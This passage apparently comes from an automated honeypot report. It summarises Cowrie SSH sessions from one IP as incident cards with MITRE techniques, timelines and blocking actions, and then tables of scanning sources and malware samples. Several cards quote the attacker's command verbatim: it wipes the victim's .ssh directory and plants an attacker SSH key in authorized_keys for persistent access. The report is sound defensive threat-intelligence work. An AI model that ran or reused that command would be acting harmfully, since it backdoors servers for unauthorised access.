| `2026-05-17 12:22:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffe91fff015b

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-17 12:22 |
| **Last Seen** | 2026-05-17 12:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 12:22:44` | `cowrie.session.connect` |
| `2026-05-17 12:22:44` | `cowrie.client.version` |
| `2026-05-17 12:22:44` | `cowrie.client.kex` |
| `2026-05-17 12:22:45` | `cowrie.login.success` |
| `2026-05-17 12:22:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f55046a81269

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-17 12:24 |
| **Last Seen** | 2026-05-17 12:24 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 12:24:37` | `cowrie.session.connect` |
| `2026-05-17 12:24:37` | `cowrie.client.version` |
| `2026-05-17 12:24:37` | `cowrie.client.kex` |
| `2026-05-17 12:24:38` | `cowrie.login.success` |
| `2026-05-17 12:24:39` | `cowrie.session.params` |
| `2026-05-17 12:24:39` | `cowrie.command.input` |
| `2026-05-17 12:24:39` | `cowrie.command.failed` |
| `2026-05-17 12:24:40` | `cowrie.log.closed` |
| `2026-05-17 12:24:40` | `cowrie.session.params` |
| `2026-05-17 12:24:40` | `cowrie.command.input` |
| `2026-05-17 12:24:40` | `cowrie.session.file_download` |
| `2026-05-17 12:24:40` | `cowrie.log.closed` |
| `2026-05-17 12:24:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb6da4435c0a

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-17 12:24 |
| **Last Seen** | 2026-05-17 12:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 12:24:43` | `cowrie.session.connect` |
| `2026-05-17 12:24:44` | `cowrie.client.version` |
| `2026-05-17 12:24:46` | `cowrie.client.kex` |
| `2026-05-17 12:24:47` | `cowrie.login.success` |
| `2026-05-17 12:24:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab5aad34de0c

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-17 12:26 |
| **Last Seen** | 2026-05-17 12:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 12:26:37` | `cowrie.session.connect` |
| `2026-05-17 12:26:37` | `cowrie.client.version` |
| `2026-05-17 12:26:37` | `cowrie.client.kex` |
| `2026-05-17 12:26:38` | `cowrie.login.success` |
| `2026-05-17 12:26:38` | `cowrie.session.params` |
| `2026-05-17 12:26:38` | `cowrie.command.input` |
| `2026-05-17 12:26:38` | `cowrie.command.failed` |
| `2026-05-17 12:26:38` | `cowrie.log.closed` |
| `2026-05-17 12:26:39` | `cowrie.session.params` |
| `2026-05-17 12:26:39` | `cowrie.command.input` |
| `2026-05-17 12:26:39` | `cowrie.session.file_download` |
| `2026-05-17 12:26:39` | `cowrie.log.closed` |
| `2026-05-17 12:26:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f268dd5fda7f

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-17 12:26 |
| **Last Seen** | 2026-05-17 12:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 12:26:42` | `cowrie.session.connect` |
| `2026-05-17 12:26:42` | `cowrie.client.version` |
| `2026-05-17 12:26:42` | `cowrie.client.kex` |
| `2026-05-17 12:26:43` | `cowrie.login.success` |
| `2026-05-17 12:26:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48bd74b5ac9f

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-17 12:28 |
| **Last Seen** | 2026-05-17 12:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 12:28:30` | `cowrie.session.connect` |
| `2026-05-17 12:28:30` | `cowrie.client.version` |
| `2026-05-17 12:28:31` | `cowrie.client.kex` |
| `2026-05-17 12:28:31` | `cowrie.login.success` |
| `2026-05-17 12:28:32` | `cowrie.session.params` |
| `2026-05-17 12:28:32` | `cowrie.command.input` |
| `2026-05-17 12:28:32` | `cowrie.command.failed` |
| `2026-05-17 12:28:32` | `cowrie.log.closed` |
| `2026-05-17 12:28:32` | `cowrie.session.params` |
| `2026-05-17 12:28:32` | `cowrie.command.input` |
| `2026-05-17 12:28:33` | `cowrie.session.file_download` |
| `2026-05-17 12:28:33` | `cowrie.log.closed` |
| `2026-05-17 12:28:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52bf4963a609

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-17 12:28 |
| **Last Seen** | 2026-05-17 12:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 12:28:36` | `cowrie.session.connect` |
| `2026-05-17 12:28:36` | `cowrie.client.version` |
| `2026-05-17 12:28:36` | `cowrie.client.kex` |
| `2026-05-17 12:28:36` | `cowrie.login.success` |
| `2026-05-17 12:28:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b895da79fa31

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-17 12:30 |
| **Last Seen** | 2026-05-17 12:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 12:30:24` | `cowrie.session.connect` |
| `2026-05-17 12:30:24` | `cowrie.client.version` |
| `2026-05-17 12:30:24` | `cowrie.client.kex` |
| `2026-05-17 12:30:25` | `cowrie.login.success` |
| `2026-05-17 12:30:25` | `cowrie.session.params` |
| `2026-05-17 12:30:25` | `cowrie.command.input` |
| `2026-05-17 12:30:25` | `cowrie.command.failed` |
| `2026-05-17 12:30:26` | `cowrie.log.closed` |
| `2026-05-17 12:30:26` | `cowrie.session.params` |
| `2026-05-17 12:30:26` | `cowrie.command.input` |
| `2026-05-17 12:30:26` | `cowrie.session.file_download` |
| `2026-05-17 12:30:26` | `cowrie.log.closed` |
| `2026-05-17 12:30:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63e18802db4a

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-17 12:30 |
| **Last Seen** | 2026-05-17 12:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 12:30:28` | `cowrie.session.connect` |
| `2026-05-17 12:30:29` | `cowrie.client.version` |
| `2026-05-17 12:30:29` | `cowrie.client.kex` |
| `2026-05-17 12:30:30` | `cowrie.login.success` |
| `2026-05-17 12:30:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7251deecdb3b

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-17 12:32 |
| **Last Seen** | 2026-05-17 12:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 12:32:17` | `cowrie.session.connect` |
| `2026-05-17 12:32:17` | `cowrie.client.version` |
| `2026-05-17 12:32:17` | `cowrie.client.kex` |
| `2026-05-17 12:32:19` | `cowrie.login.success` |
| `2026-05-17 12:32:19` | `cowrie.session.params` |
| `2026-05-17 12:32:19` | `cowrie.command.input` |
| `2026-05-17 12:32:19` | `cowrie.command.failed` |
| `2026-05-17 12:32:19` | `cowrie.log.closed` |
| `2026-05-17 12:32:20` | `cowrie.session.params` |
| `2026-05-17 12:32:20` | `cowrie.command.input` |
| `2026-05-17 12:32:20` | `cowrie.session.file_download` |
| `2026-05-17 12:32:20` | `cowrie.log.closed` |
| `2026-05-17 12:32:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-687cb17746dc

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-17 12:32 |
| **Last Seen** | 2026-05-17 12:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 12:32:23` | `cowrie.session.connect` |
| `2026-05-17 12:32:23` | `cowrie.client.version` |
| `2026-05-17 12:32:24` | `cowrie.client.kex` |
| `2026-05-17 12:32:24` | `cowrie.login.success` |
| `2026-05-17 12:32:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9f4dfd324cf

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-17 12:40 |
| **Last Seen** | 2026-05-17 12:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 12:40:10` | `cowrie.session.connect` |
| `2026-05-17 12:40:10` | `cowrie.client.version` |
| `2026-05-17 12:40:10` | `cowrie.client.kex` |
| `2026-05-17 12:40:11` | `cowrie.login.success` |
| `2026-05-17 12:40:12` | `cowrie.session.params` |
| `2026-05-17 12:40:12` | `cowrie.command.input` |
| `2026-05-17 12:40:12` | `cowrie.command.failed` |
| `2026-05-17 12:40:12` | `cowrie.log.closed` |
| `2026-05-17 12:40:12` | `cowrie.session.params` |
| `2026-05-17 12:40:12` | `cowrie.command.input` |
| `2026-05-17 12:40:12` | `cowrie.session.file_download` |
| `2026-05-17 12:40:12` | `cowrie.log.closed` |
| `2026-05-17 12:40:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f71f3ef8e11

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-17 12:40 |
| **Last Seen** | 2026-05-17 12:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 12:40:16` | `cowrie.session.connect` |
| `2026-05-17 12:40:16` | `cowrie.client.version` |
| `2026-05-17 12:40:16` | `cowrie.client.kex` |
| `2026-05-17 12:40:17` | `cowrie.login.success` |
| `2026-05-17 12:40:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d822d579450b

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-17 12:42 |
| **Last Seen** | 2026-05-17 12:42 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 12:42:08` | `cowrie.session.connect` |
| `2026-05-17 12:42:08` | `cowrie.client.version` |
| `2026-05-17 12:42:08` | `cowrie.client.kex` |
| `2026-05-17 12:42:10` | `cowrie.login.success` |
| `2026-05-17 12:42:11` | `cowrie.session.params` |
| `2026-05-17 12:42:11` | `cowrie.command.input` |
| `2026-05-17 12:42:11` | `cowrie.command.failed` |
| `2026-05-17 12:42:11` | `cowrie.log.closed` |
| `2026-05-17 12:42:12` | `cowrie.session.params` |
| `2026-05-17 12:42:12` | `cowrie.command.input` |
| `2026-05-17 12:42:13` | `cowrie.session.file_download` |
| `2026-05-17 12:42:13` | `cowrie.log.closed` |
| `2026-05-17 12:42:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaf2360803dd

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-17 12:42 |
| **Last Seen** | 2026-05-17 12:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 12:42:16` | `cowrie.session.connect` |
| `2026-05-17 12:42:16` | `cowrie.client.version` |
| `2026-05-17 12:42:16` | `cowrie.client.kex` |
| `2026-05-17 12:42:18` | `cowrie.login.success` |
| `2026-05-17 12:42:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `107.182.234[.]69` | **219** | 2026-05-17 11:10 | 2026-05-17 13:27 | 164m | 0 | `T1592` | 🟠 MEDIUM |
| `175.107.31[.]20` | **145** | 2026-05-17 11:12 | 2026-05-17 12:54 | 101m | 0 | `T1592` | 🟠 MEDIUM |
| `137.184.204[.]8` | **138** | 2026-05-17 11:39 | 2026-05-17 13:27 | 108m | 0 | `T1592` | 🟠 MEDIUM |
| `45.148.120[.]187` | **29** | 2026-05-17 11:12 | 2026-05-17 13:24 | 32m | 0 | `T1592` | 🟠 MEDIUM |
| `40.82.214[.]8` | **20** | 2026-05-17 12:01 | 2026-05-17 12:42 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `106.13.46[.]139` | **4** | 2026-05-17 12:32 | 2026-05-17 12:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `120.196.66[.]80` | **4** | 2026-05-17 11:10 | 2026-05-17 11:15 | 8m | 0 | `T1592` | 🟢 LOW |
| `16.58.56[.]214` | **2** | 2026-05-17 12:23 | 2026-05-17 12:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `49.51.197[.]125` | **2** | 2026-05-17 12:49 | 2026-05-17 12:55 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `118.31.61[.]125` | 1 | 2026-05-17 12:48 | 2026-05-17 12:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `124.66.99[.]26` | 1 | 2026-05-17 11:42 | 2026-05-17 11:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `128.116.129[.]157` | 1 | 2026-05-17 11:14 | 2026-05-17 11:14 | 13s | 0 | `T1592` | 🟢 LOW |
| `182.218.116[.]96` | 1 | 2026-05-17 12:47 | 2026-05-17 12:47 | 30s | 0 | `T1592` | 🟢 LOW |
| `43.159.136[.]59` | 1 | 2026-05-17 12:53 | 2026-05-17 12:53 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `54.146.183[.]54` | 1 | 2026-05-17 12:57 | 2026-05-17 12:57 | 1s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
